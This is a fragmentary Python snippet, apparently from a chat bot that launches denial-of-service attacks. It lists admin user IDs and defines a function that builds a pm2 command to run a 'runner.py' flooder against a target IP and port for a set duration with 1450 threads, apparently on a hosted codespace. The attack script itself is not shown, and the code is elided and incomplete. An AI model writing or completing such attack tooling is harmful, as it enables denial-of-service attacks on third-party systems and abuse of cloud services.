...
# Admins list
ADMIN_IDS = [5879359815]  # Replace with actual admin user IDs
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    threads = 1450  # Fixed thread count
    command = f"pm2 start runner.py --interpreter=python3 --name=smokey-runner -- {target_ip} {target_port} {duration} {threads}"
    # Execute the command here (e.g., using asyncio.create_subprocess_shell or paramiko if SSH)
    ...
    try:
        ...
        logging.error(f"Failed to execute command via pm2: {e}")
    finally:
